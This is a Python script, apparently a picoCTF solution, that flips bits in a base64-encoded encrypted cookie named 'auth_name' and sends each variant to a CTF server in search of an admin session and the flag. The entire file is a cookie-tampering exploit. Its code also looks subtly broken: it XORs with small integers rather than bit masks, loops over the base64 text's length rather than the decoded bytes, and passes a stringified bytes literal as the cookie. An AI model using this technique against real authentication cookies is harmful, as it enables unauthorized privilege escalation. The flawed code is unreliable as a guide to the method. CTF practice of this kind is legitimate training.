#Need to go through and flip each bit of ciphertext until flip bit setting admin = 1
#Step 1: be able to send requests from python
#Step 2: get bit flipping to work
import requests 
from base64 import b64decode
from base64 import b64encode

#Display reponse
def displayResponse(cookies):
    url = "http://mercury.picoctf.net:25992/"
    #GET reponse to API
    response = requests.get(url, cookies=cookies)  
    response_text = response.text
    #response_cookies = response.cookies
    #print(response_cookies)
    if "picoCTF" in response_text:
        print(response_text)

#function that does bitflip
def bitFlip(pos, bit, data):
    raw = b64decode(data)
    list1 = list(raw)
    list1[pos] = list1[pos]^bit
    raw = bytes(list1)
    return b64encode(bytes(raw))



#go through each bit 
ciphertext = "RVJwME9QNll2YldWWm04NWNVUzdCUE80STZQd0p6NU1DNEp2N3l2enJMclRVNnpVanEyTjdiK0NZaGw1aitKa1ltWG0ybUJXc1FkbG9YUVVMZElNd0luYzRoZDB2a0dCckc2cWxxWWVObWJuZ2tjMngvQUxXNzhvUWNubWl3bEo="
for pos in range(0, len(ciphertext)):
    for bit in range(0, 8):
        editCiphertext = str(bitFlip(pos, bit, ciphertext))
        cookies = {'auth_name': editCiphertext}
        displayResponse(cookies)
